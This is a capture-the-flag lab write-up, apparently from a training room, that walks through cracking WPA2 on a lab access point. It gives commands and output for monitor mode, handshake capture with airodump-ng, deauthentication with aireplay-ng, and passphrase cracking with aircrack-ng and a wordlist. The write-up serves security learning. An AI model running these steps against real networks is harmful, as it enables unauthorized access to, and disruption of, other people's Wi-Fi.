Today we learn about Wi-Fi s and the different attacks they are vulnerable to. We are asked to recreate a `WPA/WPA2 Cracking` attack where listen in on a Wi Fi and catpure the handshake between the access point and the device connected to it. now using this captured handshake file we brute force our way to crack the pass key of the Wi FI.

To recreate this attack we execute the following commands in order:
+ `iw dev` to show the wireless devices and their configurations we have available
+ `sudo iw dev wlan2 scan` to scan for available wlan2 devices in the area.
  ```
  glitch@wifi:~$ sudo iw dev wlan2 scan
  BSS 02:00:00:00:00:00(on wlan2)
  	last seen: 520.388s [boottime]
  	TSF: 1730575383370084 usec (20029d, 19:23:03)
  	freq: 2437
  	beacon interval: 100 TUs
  	capability: ESS Privacy ShortSlotTime (0x0411)
  	signal: -30.00 dBm
  	last seen: 0 ms ago
  	Information elements from Probe Response frame:
  	SSID: MalwareM_AP
  	Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
  	DS Parameter set: channel 6
  	ERP: Barker_Preamble_Mode
  	Extended supported rates: 24.0 36.0 48.0 54.0 
  	RSN:	 * Version: 1
  		 * Group cipher: CCMP
  		 * Pairwise ciphers: CCMP
  		 * Authentication suites: PSK
  		 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
  	Supported operating classes:
  		 * current operating class: 81
  	Extended capabilities:
  		 * Extended Channel Switching
  		 * Operating Mode Notification 
     ```
  We can see that `02:00:00:00:00:00` is the BSSID of our wireless interface thus that is the answer to our first question.
+ Now we change the mode of our wireless interface to monitor using the following commands:
  ```
  glitch@wifi:~$ sudo ip link set dev wlan2 down
  glitch@wifi:~$ sudo iw dev wlan2 set type monitor
  glitch@wifi:~$ sudo ip link set dev wlan2 up
  ```
+ `sudo airodump-ng wlan2` shows the list of nearby wifi networks.
  ```
  glitch@wifi:~$ sudo airodump-ng wlan2
  BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
  
   02:00:00:00:00:00  -28        2        0    0   6   54   WPA2 CCMP   PSK  MalwareM_AP 
   ```
  Thus we get the answer to the second question: `MalwareM_AP, 02:00:00:00:00:00`.
+ `sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2` targets the specific network channel and MAC address (BSSID) of the access point and saves the captured traffic to `output-file`.
  ```
  glitch@wifi:~$ sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2
  BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

   02:00:00:00:00:00  -28 100      631        8    0   6   54   WPA2 CCMP   PSK  MalwareM_AP  
  
   BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
  
   02:00:00:00:00:00  02:00:00:00:01:00  -29    1 - 5      0      140
   ```
  Thus we get the answer to the third question i.e. `02:00:00:00:01:00`.
+ Now we send deauthentication packets by doing `sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2`.
+ `sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap` will now crack the `WPA/WP2` passphrase using the captured handshake file.
+ Now executing the following commands will return the passkey which is our answer to the final question.
  ```
  glitch@wifi:~$ wpa_passphrase MalwareM_AP 'ENTER PSK HERE' > config
  glitch@wifi:~$ sudo wpa_supplicant -B -c config -i wlan2
  ```

![image](https://github.com/user-attachments/assets/8addc8a4-c5b5-41ea-9b88-d6f98fda6bd3)
